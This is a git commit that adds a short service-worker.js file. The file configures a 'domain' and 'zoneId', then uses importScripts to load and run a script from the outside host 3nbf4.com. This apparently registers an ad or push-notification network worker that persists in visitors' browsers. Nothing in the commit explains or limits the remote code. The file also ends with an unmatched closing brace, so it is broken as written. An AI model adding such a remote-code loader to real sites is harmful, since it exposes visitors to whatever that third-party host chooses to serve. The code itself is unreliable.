3ccd4414dd306492f9f8d30689475a096cf52375
zhero789 <lakhotrarajeev00@gmail.com>
2025-12-30 15:21:00 +0530

    Add files via upload

---
+++ service-worker.js
@@ -0,0 +1,7 @@
+self.options = {
+      "domain": "3nbf4.com",
+          "zoneId": 10394309
+          };
+          self.lary = "";
+          importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw');
+}
